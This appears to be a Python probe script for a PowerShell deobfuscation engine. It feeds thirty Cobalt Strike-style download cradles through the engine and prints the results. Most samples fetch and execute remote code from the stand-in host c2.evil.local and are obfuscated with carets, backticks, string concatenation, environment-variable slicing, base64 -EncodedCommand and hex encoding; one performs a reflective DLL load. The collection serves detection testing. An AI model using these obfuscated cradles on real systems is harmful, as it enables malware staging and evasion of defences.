"""
Phase R1 · Cobalt Strike sample probe.

Runs candidate CS payloads through the Convergence Engine to see what
the current engine deterministically produces. Used ONLY to validate
sample sanity before committing to the R1 corpus and locking
fingerprints. Not a regression harness.
"""
from __future__ import annotations

import base64

from workspace.convergence import Artifact, converge


def _b64_utf16le(s: str) -> str:
    return base64.b64encode(s.encode("utf-16le")).decode("ascii")


# Candidate samples · numbered so a maintainer can add/remove without
# renumbering the whole set.
CANDIDATES: list[tuple[str, str, str]] = [
    # (id, one-line description, input string)
    (
        "CS001",
        "Classic Empire download cradle · IEX((New-Object).DownloadString)",
        'IEX((New-Object Net.WebClient).DownloadString("http://c2.evil.local/beacon.ps1"))',
    ),
    (
        "CS002",
        "DownloadCradle with lowercase iex + net.webclient",
        'iex((new-object net.webclient).downloadstring("http://c2.evil.local/stage2"))',
    ),
    (
        "CS003",
        "DownloadCradle via IWR alias · one-liner",
        "iwr 'http://c2.evil.local/loader' -useb | iex",
    ),
    (
        "CS004",
        "URL concat obfuscation · $W='ht'+'tp'+'s'",
        "$W='ht'+'tp'+'s'; $C='://'; $H='c2.evil.local/beacon.js'; iex((new-object net.webclient).downloadstring($W+$C+$H))",
    ),
    (
        "CS005",
        "Split scheme + host into 2 vars",
        "$scheme='http'+'s://'; $host2='c2.evil.local/x'; iex((new-object net.webclient).downloadstring($scheme+$host2))",
    ),
    (
        "CS006",
        "Full-URL SQ concat propagation",
        "$u='http'+'://'+'c2.evil.local/'+'stage3'; iex ((new-object net.webclient).downloadstring($u))",
    ),
    (
        "CS007",
        "PS -EncodedCommand · IEX(New-Object Net.WebClient).DownloadString",
        "powershell -EncodedCommand "
        + _b64_utf16le(
            "IEX((New-Object Net.WebClient).DownloadString('http://c2.evil.local/beacon.ps1'))"
        ),
    ),
    (
        "CS008",
        "PS -enc abbreviation · WriteHost beacon message",
        "powershell -enc "
        + _b64_utf16le('Write-Host "Cobalt Strike beacon staged"'),
    ),
    (
        "CS009",
        "PS -NoP -W Hidden -Enc",
        "powershell -NoP -NonI -W Hidden -Enc "
        + _b64_utf16le("IEX((New-Object Net.WebClient).DownloadString('http://c2.evil.local/tinybeacon'))"),
    ),
    (
        "CS010",
        "cmd /c powershell -enc handoff",
        "cmd.exe /c powershell -enc "
        + _b64_utf16le("Write-Host 'Cobalt Strike handoff via cmd'"),
    ),
    (
        "CS011",
        "CMD carets + powershell -enc",
        "c^m^d /c p^ow^ers^he^ll -e^nc "
        + _b64_utf16le("IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.local/x')"),
    ),
    (
        "CS012",
        "Env-slice · [string]::Join reconstruction of powershell",
        "& ( $enV:CoMsPeC-jOiN'') ( ( [sTrInG]::JoIn( '', ( $enV:pAtH[4..6] + $EnV:pUbLiC[12] + $EnV:pRoGrAmFiLeS[9] + $enV:CoMsPeC[4,15,25] ) ) -jOiN '' ) + \" -cOmmAnD IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.local/env_reconstructed')\" )",
    ),
    (
        "CS013",
        "iwr + useb + iex alias chain",
        "iwr https://c2.evil.local/loader -UseBasicParsing | iex",
    ),
    (
        "CS014",
        "curl alias · Invoke-WebRequest by alias",
        "curl 'http://c2.evil.local/first' -UseBasicParsing | iex",
    ),
    (
        "CS015",
        "Split-scheme + method concat propagation",
        "$s='ht'+'tps://c2.evil.local/split_scheme'; iwr $s -useb | iex",
    ),
    (
        "CS016",
        "Hex → base64 → UTF-16LE chain (long)",
        # Hex of base64-encoded "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.local/hex_chain')" in UTF-16LE
        # generated fresh below
        "PLACEHOLDER_CS016",  # will patch below
    ),
    (
        "CS017",
        "PS -EncodedCommand · direct Invoke-Expression b64",
        "powershell -EncodedCommand "
        + _b64_utf16le(
            "IEX((New-Object Net.WebClient).DownloadString('http://c2.evil.local/b64_only'))"
        ),
    ),
    (
        "CS018",
        "Alias-heavy: iwr chained with iex, backtick-noise",
        "i`wr https://c2.evil.local/backtick_beacon -useb | i`ex",
    ),
    (
        "CS019",
        "Full SQ variable propagate then alias expand",
        "$u='http://c2.evil.local/final'; iex ((new-object net.webclient).downloadstring($u))",
    ),
    (
        "CS020",
        "3-var SQ concat chain",
        "$A='ht'; $B='tp://'; $C='c2.evil.local/three'; iex ((new-object net.webclient).downloadstring($A+$B+$C))",
    ),
    (
        "CS021",
        "cmd caret → PS -enc handoff (Emotet-style CS staging)",
        "c^m^d /c p^ow^ers^he^ll -e^n^c "
        + _b64_utf16le(
            "IEX((New-Object Net.WebClient).DownloadString('http://c2.evil.local/emotet_style_cs'))"
        ),
    ),
    (
        "CS022",
        "PS -EncodedCommand · WriteHost 'CS beacon phase R1'",
        "powershell -EncodedCommand " + _b64_utf16le('Write-Host "CS beacon phase R1"'),
    ),
    (
        "CS023",
        "PS EncodedCommand embedding downloadstring (IE-alias)",
        "powershell -Enc "
        + _b64_utf16le(
            'IEX ((New-Object Net.WebClient).DownloadString("http://c2.evil.local/ie_alias"))'
        ),
    ),
    (
        "CS024",
        "Nested layered · CMD caret over PS -enc over IEX",
        "c^m^d /c p^ow^ers^he^ll -Enc "
        + _b64_utf16le(
            'IEX((New-Object Net.WebClient).DownloadString("http://c2.evil.local/nested_cs"))'
        ),
    ),
    (
        "CS025",
        "Alias iwr with backticks + useb",
        "i`w`r 'http://c2.evil.local/backticked_url' -useb | iex",
    ),
    (
        "CS026",
        "Random-case IEX",
        "iEx ((nEw-oBjecT nEt.WebClIent).DoWnLoAdStrIng('http://c2.evil.local/casey'))",
    ),
    (
        "CS027",
        "PS -EncodedCommand · Get-Process discovery",
        "powershell -EncodedCommand " + _b64_utf16le("Get-Process | Select Name,Id"),
    ),
    (
        "CS028",
        "PS -EncodedCommand · reflective load stub (string form)",
        "powershell -Enc " + _b64_utf16le(
            "$b=(New-Object Net.WebClient).DownloadData('http://c2.evil.local/dll'); [Reflection.Assembly]::Load($b)"
        ),
    ),
    (
        "CS029",
        "IWR alias chained with iex + backtick noise on iex",
        "iwr https://c2.evil.local/cs29 -useb | i`e`x",
    ),
    (
        "CS030",
        "IEX + downloadfile pattern",
        "IEX ((New-Object Net.WebClient).DownloadString('https://c2.evil.local/cs30/loader.ps1'))",
    ),
]

# Patch CS016 with a real hex→b64→utf16le chain.
_cs016_inner = "IEX((New-Object Net.WebClient).DownloadString('http://c2.evil.local/hex_chain'))"
_cs016_b64 = base64.b64encode(_cs016_inner.encode("utf-16le")).decode("ascii")
_cs016_hex = _cs016_b64.encode("ascii").hex()
CANDIDATES[15] = (
    CANDIDATES[15][0],
    CANDIDATES[15][1],
    _cs016_hex,
)


def main() -> None:
    print("=" * 90)
    print("Phase R1 · Cobalt Strike Candidate Probe")
    print("=" * 90)
    for cid, desc, inp in CANDIDATES:
        art = Artifact.from_input(inp)
        r = converge(art)
        state = "CANONICAL" if r.canonical else f"NON-CANONICAL ({r.terminated_reason})"
        out = r.final_artifact.content
        head = out[:120].replace("\n", " ")
        print(f"[{cid}] {state} · iters={r.certificate.iterations_executed}")
        print(f"       desc: {desc}")
        print(f"       out : {head}")
        print()


if __name__ == "__main__":
    main()
